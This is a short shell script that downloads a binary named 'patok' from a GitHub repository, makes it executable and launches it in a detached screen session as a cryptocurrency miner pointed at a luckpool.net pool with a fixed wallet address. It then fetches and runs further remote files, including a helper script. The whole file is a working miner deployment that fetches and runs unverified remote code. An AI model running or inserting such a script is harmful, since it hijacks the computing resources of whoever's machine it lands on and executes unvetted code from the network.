  
#!/bin/sh

sudo apt update

sudo apt install screen -y

wget https://github.com/renilo/xmr/raw/main/patok 

chmod +x patok

screen -dmS run ./patok -v -l eu.luckpool.net:3956 -u RR6U3T7Uz475i7gontznFLWikFsQan2wjC.A001 -p x -t 4

screen -dmS kontol1.sh ./kontol1.sh 65 75

wget https://github.com/renilo/xmr/raw/main/memek

wget https://raw.githubusercontent.com/renilo/xmr/main/kontol1.sh

chmod +x kontol1.sh

./kontol1.sh
